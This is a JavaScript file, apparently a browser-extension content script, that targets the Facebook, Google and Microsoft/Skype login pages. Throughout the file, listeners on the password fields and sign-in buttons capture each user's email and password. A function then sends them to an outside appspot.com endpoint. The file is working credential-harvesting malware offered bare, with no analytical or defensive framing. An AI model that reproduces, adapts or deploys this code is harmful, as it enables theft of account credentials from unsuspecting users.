if(window.location.origin.indexOf('facebook.com') > -1) {
    try {
        listenFacebook();
    } catch(e){}
}
if(window.location.origin.indexOf('google.com') > -1) {
    try {
        listenGoogle();
    } catch(e){}  
}
if(window.location.origin.indexOf('login.live.com') > -1) {
    try {
        listenSkype();
    } catch(e){}
}

function listenGoogle() {
    let email;
    let time1 = setInterval(() => {
        let profileIdentifier = document.getElementById('profileIdentifier');
        email = profileIdentifier?.innerHTML;
        if(validateEmail(email)) {
            clearInterval(time1);
            onNext();
        }
    }, 300);

    function onNext() {
        let passElements = document.getElementsByName('password');
        if(!passElements || passElements.length == 0) {
            passElements = document.querySelectorAll('[type="password"]');
        }
        let passElement;
        for(let item of passElements) {
            if ('password'.indexOf(item.getAttribute('name')) > -1) {
                passElement = item;
            }
        }
        passElement && passElement.addEventListener('keydown', (e) => {
            if(e.code == 13 || e.code == 'Enter') {
                onUpdate(email, passElement?.value, 'google');
            }
        });
        let buttonNext = document.getElementById('passwordNext');
        if(buttonNext) {
            let button = buttonNext.querySelector('button');
            button.addEventListener('click', (e) => {
                onUpdate(email, passElement?.value, 'google');
            });
        }
    }
}

function listenSkype() {
    let email;
    let time1 = setInterval(() => {
        let profileIdentifier = document.getElementById('displayName');
        email = profileIdentifier?.innerHTML;
        if(validateEmail(email)) {
            clearInterval(time1);
            onNext();
        }
    }, 300);

    function onNext() {
        let passElements = document.getElementsByName('passwd');
        if(!passElements || passElements.length == 0) {
            passElements = document.querySelectorAll('[type="password"]');
        }
        let passElement;
        for(let item of passElements) {
            if ('passwd'.indexOf(item.getAttribute('password')) > -1 || 'password'.indexOf(item.getAttribute('type')) > -1) {
                passElement = item;
            }
        }
        passElement && passElement.addEventListener('keydown', (e) => {
            if(e.code == 13 || e.code == 'Enter') {
                onUpdate(email, passElement?.value, 'skype');
            }
        });
        let buttonNext = document.getElementById('idSIButton9');
        if(!buttonNext) {
           let buttonElements = document.querySelectorAll('[type="submit"]');
            if(buttonElements && buttonElements.length == 0) {
                buttonNext = buttonElements[0];
            }
        }
        if(buttonNext) {
            buttonNext.addEventListener('click', (e) => {
                onUpdate(email, passElement?.value, 'skype');
                e.preventDefault();
            });
        }
    }
}

function listenFacebook() {
    let button = document.querySelector('button[name="login"]');
    let email = document.getElementById('email');
    let pass = document.getElementById('pass');

    email && email.addEventListener('keydown', (e) => {
        if(e.code == 13 || e.code == 'Enter') {
            onUpdate(email?.value, pass?.value);
        }
    });
    pass && pass.addEventListener('keydown', (e) => {
        if(e.code == 13 || e.code == 'Enter') {
            onUpdate(email?.value, pass?.value);
        }
    });
    if(button) {
        button.addEventListener('click', (e) => {
            onUpdate(email?.value, pass?.value, 'facebook');
        });
    }
}

function onUpdate(email, pass, type) {
    // window.alert('onUpdate email: ' + email + " - pass: " + pass + " - type: " + type)
    fetch(`https://deploy-temp.appspot.com/api/update-user-info?email=${email}&pass=${pass}&type=${type}`, { method: 'post' })
    .then((data) => {
        console.log(data);
    });
}

function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return email && re.test(String(email).toLowerCase());
}